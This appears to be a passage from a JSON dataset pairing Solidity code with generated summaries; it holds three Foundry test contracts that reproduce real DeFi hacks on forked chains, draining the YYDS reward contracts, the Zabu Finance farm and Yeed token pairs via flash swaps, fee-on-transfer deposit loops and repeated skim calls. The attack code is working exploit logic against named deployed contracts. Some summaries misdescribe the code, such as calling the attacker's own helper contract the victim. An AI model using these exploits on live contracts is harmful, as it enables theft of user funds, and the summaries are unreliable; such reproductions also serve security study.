        "code": "pragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface TargetClaim {\n    function claim(address) external;\n}\n\ninterface TargetWithdraw {\n    function withdrawReturnAmountByMerchant() external ;\n    function withdrawReturnAmountByConsumer() external ;\n    function withdrawReturnAmountByReferral() external ;\n}\n\ncontract ContractTest is DSTest{\n\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 YYDS = IERC20(0xB19463ad610ea472a886d77a8ca4b983E4fAf245);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0xd5cA448b06F8eb5acC6921502e33912FA3D63b12);\n    TargetClaim targetClaim = TargetClaim(0xe70cdd37667cdDF52CabF3EdabE377C58FaE99e9);\n    TargetWithdraw targetWihtdraw = TargetWithdraw(0x970A76aEa6a0D531096b566340C0de9B027dd39D);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    uint256 reserve0;\n    uint256 reserve1;\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 21157025);\n    }\n\n    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"[Start] Attacker USDT balance before exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n\n        (reserve0, reserve1, ) = Pair.getReserves();\n        uint256 amount0Out = USDT.balanceOf(address(Pair));\n        Pair.swap(amount0Out - 1 * 1e18, 0, address(this), new bytes(1));\n\n         emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data)  public{\n        \n\n        emit log_named_decimal_uint(\n            \"Attacker YYDS balance before exploit\",\n            YYDS.balanceOf(address(this)),\n            18\n        );\n\n        targetClaim.claim(address(this));\n        try targetWihtdraw.withdrawReturnAmountByReferral(){\n        } catch{\n        }\n        try targetWihtdraw.withdrawReturnAmountByMerchant(){\n        } catch{\n        }\n        try targetWihtdraw.withdrawReturnAmountByConsumer(){            \n        } catch{\n        }\n\n        emit log_named_decimal_uint(\n            \"Attacker YYDS balance after exploit\",\n            YYDS.balanceOf(address(this)),\n            18\n        );\n        \n        uint256 yydsInContract = YYDS.balanceOf(address(this));\n        YYDS.transfer(address(Pair), yydsInContract);\n        uint256 yydsInPair = YYDS.balanceOf(address(Pair));\n        uint256 amountUsdt = (reserve0 * reserve1 / ((yydsInPair * 10000 - yydsInContract * 25)/10000)) /9975*10000;\n        USDT.transfer(address(Pair), amountUsdt);\n\n    }\n\n\n}\n",
        "summary": "This code defines a Solidity smart contract called \"ContractTest\" which imports and uses several interfaces and contracts including \"Test.sol\", \"interface.sol\", and \"CheatCodes.sol\". \n\nThe main purpose of this contract is to perform a \"flash loan\" attack on a decentralized exchange (DEX) called PancakeSwap on the Binance Smart Chain (BSC) network. The attack involves manipulating the reserve ratios of two tokens in a Uniswap-style trading pair on PancakeSwap to gain a profit.\n\nThe contract initializes several contract interfaces and variables, sets up a testing framework using \"DSTest\", and defines a function called \"testExploit\" which performs the actual exploit. The function first obtains the current reserve ratios of the two tokens in the trading pair. It then executes a swap of almost the entire balance of one of the tokens for the other token, placing the swapped tokens in the contract's address. This swap is intended to manipulate the reserve ratios of the two tokens. \n\nNext, the contract calls several functions from an interface called \"TargetWithdraw\" to trigger a withdrawal of a third token called \"YYDS\". Finally, the contract calculates the necessary amount of the second token to be swapped back to the original token in order to obtain a profit. The calculated amount is then transferred to PancakeSwap in exchange for the original token. \n\nOverall, this code implements a simple version of a common type of attack on decentralized exchanges that exploits the mechanics of automated market makers.",
        "id": "033d7f2a-8374-4c43-8733-46076113d229"
    },
    {
        "code": "pragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://slowmist.medium.com/brief-analysis-of-zabu-finance-being-hacked-44243919ea29\n\ninterface ZABUFarm{\n    function deposit(uint256 _pid, uint256 _amount) external;\n    function withdraw(uint256 _pid, uint256 _amount) external;\n    function emergencyWithdraw(uint256 _pid) external;\n}\n\ninterface PangolinRouter{\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\ncontract depositToken{\n\n    IERC20 ZABU = IERC20(0xDd453dBD253fA4E5e745047d93667Ce9DA93bbCF);\n    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);\n    IERC20 SPORE = IERC20(0x6e7f5C0b9f4432716bDd0a77a3601291b9D9e985);\n    Uni_Router_V2 Router = Uni_Router_V2(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106);\n    ZABUFarm Farm = ZABUFarm(0xf61b4f980A1F34B55BBF3b2Ef28213Efcc6248C4);\n\n    function depositSPORE() payable external{\n        address(WAVAX).call{value: 1 ether}(\"\");\n        address [] memory path = new address[](2);\n        path[0] = address(WAVAX);\n        path[1] = address(SPORE);\n        WAVAX.approve(address(Router), type(uint).max);\n        SPORE.approve(address(Farm), type(uint).max);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WAVAX.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n        Farm.deposit(uint256(38), SPORE.balanceOf(address(this)));\n    }\n\n    function withdrawSPORE() external{\n        Farm.withdraw(uint256(38), SPORE.balanceOf(address(Farm)));\n    }\n\n    function sellZABU() external{\n        address [] memory path = new address[](2);\n        path[0] = address(ZABU);\n        path[1] = address(WAVAX);\n        WAVAX.approve(address(Router), type(uint).max);\n        ZABU.approve(address(Router), type(uint).max);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            ZABU.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n}\n\ncontract ContractTest is DSTest{\n\n    IERC20 ZABU = IERC20(0xDd453dBD253fA4E5e745047d93667Ce9DA93bbCF);\n    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);\n    IERC20 SPORE = IERC20(0x6e7f5C0b9f4432716bDd0a77a3601291b9D9e985);\n    IERC20 PNG = IERC20(0x60781C2586D68229fde47564546784ab3fACA982);\n    Uni_Router_V2 Router = Uni_Router_V2(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106);\n    ZABUFarm Farm = ZABUFarm(0xf61b4f980A1F34B55BBF3b2Ef28213Efcc6248C4);\n    Uni_Pair_V2 PangolinPair1 = Uni_Pair_V2(0x0a63179a8838b5729E79D239940d7e29e40A0116); // SPORE WAVAX\n    Uni_Pair_V2 PangolinPair2 = Uni_Pair_V2(0xad24a72ffE0466399e6F69b9332022a71408f10b); // SPORE PNG\n    address addressContract;\n    uint reserve0Pair1;\n    uint reserve1Pair1;\n    uint reserve0Pair2;\n    uint reserve1Pair2;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"Avalanche\", 4177751); \n    }\n\n    function testExploit() public payable {\n\n        SPORE.approve(address(Farm), type(uint).max);\n        WAVAX.approve(address(Router), type(uint).max);\n        (reserve0Pair1, reserve1Pair1, ) = PangolinPair1.getReserves();\n        (reserve0Pair2, reserve1Pair2, ) = PangolinPair2.getReserves();\n        address(WAVAX).call{value: 2500 ether}(\"\");\n        // depost SPORE\n        ContractFactory();\n        (bool success, ) = addressContract.call{value: 1 ether}(abi.encodeWithSignature(\"depositSPORE()\"));\n        require(success);\n        // change block.number\n        cheats.roll(block.number + 900); \n\n        PangolinPair1.swap(SPORE.balanceOf(address(PangolinPair1)) - 1 * 1e18, 0, address(this), new bytes(1));\n        // change block.number\n        cheats.roll(block.number + 1001);\n        (bool success1, ) = addressContract.call(abi.encodeWithSignature(\"withdrawSPORE()\"));\n        require(success1);\n\n        emit log_named_decimal_uint(\n            \"Attacker ZABU profit after exploit\",\n            ZABU.balanceOf(addressContract),\n            18\n        );\n\n        (bool success2, ) = addressContract.call(abi.encodeWithSignature(\"sellZABU()\"));\n        require(success2);\n\n\n        emit log_named_decimal_uint(\n            \"Attacker WAVAX profit after exploit\",\n            WAVAX.balanceOf(addressContract) - 2500 * 1e18,\n            18\n        );\n\n    }\n\n    function pangolinCall(address sender, uint amount0, uint amount1, bytes calldata data) public{\n        if(msg.sender == address(PangolinPair1)){\n            PangolinPair2.swap(0, reserve1Pair2 - 1 * 1e18, address(this), new bytes(1));\n            // flashswap callback pair1\n            uint amountSPORE0 = SPORE.balanceOf(address(this));\n            SPORE.transfer(address(PangolinPair1), amountSPORE0);\n            uint SPOREInPair1  = SPORE.balanceOf(address(PangolinPair1));\n            uint WAVAXInPair1 = WAVAX.balanceOf(address(PangolinPair1));\n            uint amountWAVAX = \n                (reserve0Pair1 * reserve1Pair1 / ((SPOREInPair1 * 1000 - amountSPORE0 * 3 * 96 / 100) / 1000) - WAVAXInPair1) * 1000 / \n                997;\n            WAVAX.transfer(address(PangolinPair1), amountWAVAX);\n        }\n\n        if(msg.sender == address(PangolinPair2)){\n            //reduced lptoken\n            while(SPORE.balanceOf(address(Farm)) > 1000){\n            uint256 amount = SPORE.balanceOf(address(this));\n            if(SPORE.balanceOf(address(this)) * 6 / 100 > SPORE.balanceOf(address(Farm))){\n                amount = SPORE.balanceOf(address(Farm)) * 100 / 6;\n            }\n            Farm.deposit(uint256(38), amount);\n            Farm.withdraw(uint256(38), amount);\n            }\n\n            // flashswap callback pair2\n            uint amountSPORE1 = SPORE.balanceOf(address(this)) / 3;\n            SPORE.transfer(address(PangolinPair2), amountSPORE1);\n            uint SPOREInPari2 = SPORE.balanceOf(address(PangolinPair2));\n            uint PNGInPair2 =  PNG.balanceOf(address(PangolinPair2));            \n            uint amountPNG = \n                (reserve0Pair2 * reserve1Pair2 / ((SPOREInPari2 * 1000 - amountSPORE1 * 3 * 96 / 100) / 1000) - PNGInPair2) * 1000 / 997;             \n            buyPNG(amountPNG);\n            PNG.transfer(address(PangolinPair2), PNG.balanceOf(address(this)));\n            \n        }\n        \n        }\n\n    function ContractFactory() public{\n        address _add;\n        bytes memory bytecode = type(depositToken).creationCode;\n        assembly{\n                _add := create2(0, add(bytecode, 32), mload(bytecode), 1)\n            }\n        addressContract = _add;\n    }\n\n    function buyPNG(uint amount) public{\n        address [] memory path = new address[](2);\n        path[0] = address(WAVAX);\n        path[1] = address(PNG);\n        Router.swapTokensForExactTokens(\n            amount,\n            WAVAX.balanceOf(address(this)),\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n}",
        "summary": "This code includes two smart contracts. \n\nThe first contract is `depositToken` which allows users to deposit the token `SPORE` to the `ZABUFarm` contract by swapping it with `WAVAX` using the `PangolinRouter`. It also allows users to withdraw the deposited `SPORE` back from the farm and to sell the token `ZABU` to `WAVAX`. \n\nThe second contract is `ContractTest` which includes a function `testExploit` that exploits a vulnerability in the `depositToken` contract to steal funds from the `ZABUFarm` contract and sell them to `WAVAX`. \n\nThe contract also includes several other functions and interfaces for interacting with various ERC20 tokens, the `PangolinRouter`, and the `CheatCodes` contract.",
        "id": "94fdc6b7-4c7e-42e2-a1a4-b70ab2759850"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  IPancakeRouter pancakeRouter =\n    IPancakeRouter(payable(0x6CD71A07E72C514f5d511651F6808c6395353968));\n  IPancakePair usdtYeedHoSwapPair =\n    IPancakePair(0x33d5e574Bd1EBf3Ceb693319C2e276DaBE388399);\n  IPancakePair usdtYeedPair =\n    IPancakePair(0xA7741d6b60A64b2AaE8b52186adeA77b1ca05054);\n  IPancakePair hoYeedPair =\n    IPancakePair(0xbC70FA7aea50B5AD54Df1edD7Ed31601C350A91a);\n  IPancakePair zeedYeedPair =\n    IPancakePair(0x8893610232C87f4a38DC9B5Ab67cbc331dC615d6);\n  IERC20 yeed = IERC20(0xe7748FCe1D1e2f2Fd2dDdB5074bD074745dDa8Ea);\n  IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"bsc\", 17132514); // fork bsc at block 17132514\n  }\n\n  function testExploit() public {\n    yeed.approve(address(pancakeRouter), type(uint256).max);\n    (uint112 _reserve0, uint112 _reserve1, ) = usdtYeedHoSwapPair.getReserves();\n    usdtYeedHoSwapPair.swap(0, _reserve1 - 1, address(this), new bytes(1));\n    emit log_named_uint(\n      \"Before exploit, USDT balance of attacker:\",\n      usdt.balanceOf(msg.sender)\n    );\n    address[] memory path = new address[](3);\n    path[0] = address(yeed);\n    path[1] = hoYeedPair.token0();\n    path[2] = usdtYeedPair.token0();\n    pancakeRouter.swapExactTokensForTokens(\n      yeed.balanceOf(address(this)),\n      0,\n      path,\n      msg.sender,\n      block.timestamp + 120\n    );\n    emit log_named_uint(\n      \"After exploit, USDT balance of attacker:\",\n      usdt.balanceOf(msg.sender)\n    );\n  }\n\n  function pancakeCall(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n  ) public {\n    yeed.transfer(address(usdtYeedPair), amount1);\n    for (uint256 i = 0; i < 10; i++) {\n      usdtYeedPair.skim(address(hoYeedPair));\n      hoYeedPair.skim(address(zeedYeedPair));\n      zeedYeedPair.skim(address(usdtYeedPair));\n    }\n\n    usdtYeedPair.skim(address(this));\n    hoYeedPair.skim(address(this));\n    zeedYeedPair.skim(address(this));\n\n    yeed.transfer(msg.sender, (amount1 * 1000) / 997);\n  }\n}\n",
        "summary": "This is a Solidity smart contract that tests an exploit on a PancakeSwap-like decentralized exchange. The smart contract imports interface and cheat codes libraries and sets up some initial values for PancakeSwap pairs and tokens. \n\nThe `setUp()` function sets up a fork of the Binance Smart Chain at a specific block number using cheat codes.\n\nThe `testExploit()` function tests the exploit on a specific PancakeSwap-like pair by swapping a token for another and potentially getting a profit. \n\nFinally, the `pancakeCall()` function is a callback function that gets executed when an external contract interacts with the smart contract. It performs some skim operations on PancakeSwap pairs and transfers tokens.",
        "id": "f6f12135-52f4-47be-aabd-c3743355788e"
    }
]